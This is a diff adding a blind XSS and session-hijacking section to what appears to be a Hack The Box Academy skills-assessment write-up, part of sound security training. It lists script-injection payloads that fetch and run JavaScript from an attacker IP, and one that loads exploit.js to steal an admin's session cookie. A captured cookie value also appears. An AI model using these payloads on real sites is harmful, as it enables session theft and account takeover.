@@ -184,6 +184,48 @@ Victim IP: 10.129.34.48 | Cookie: cookie=c00k1355h0u1d8353cu23d
 
 # XSS Skills Assessment  
 
+>[Cross Site Scripting XSS Skills Assessment](https://academy.hackthebox.com/module/103/section/1011)  
+
+>Posting a comment to the assessment blog, there is message, `Your comment is awaiting moderation.`.
+
 ![xss assessment await-moderation](/images/xss-assessmennt-await-moderation.png)  
 
->[PayloadALlTheThings XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc)  
+>Reference: [PayloadALlTheThings XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc)  
+
+## Blind XSS Detection  
+
+>A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.  
+
+>Testing payloads to identify Blind XSS - loading a remote script:  
+
+```
+<script src=http://10.10.15.41></script>
+'><script src=http://10.10.15.41></script>
+"><script src=http://10.10.15.41></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.15.41\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.15.41");a.send();</script>
+<script>$.getScript("http://10.10.15.41")</script>
+```  
+
+![xss-blind-injection-identified](/images/xss-blind-injection-identified.png)  
+
+>Successful payload identified as, `'><script src=http://10.10.15.41></script>`  
+
+## Session Hijacking  
+
+>Loading a Remote Exploit JavaScript Script payload. [Session Hijacking](https://academy.hackthebox.com/module/103/section/1008)  
+
+```
+'><script src=http://10.10.15.41/exploit.js></script>
+```  
+
+>Submitting the blind XSS injection to steal cookie of the admin moderator.  
+
+![xss-blind-post-comment](/images/xss-blind-post-comment.png)  
+
+>Cookie Stealer obtained the value of the 'flag' cookie.  
+
+![xss-assessmennt-admin-cookie-stolen](/images/xss-assessmennt-admin-cookie-stolen.png)  
+
+
+
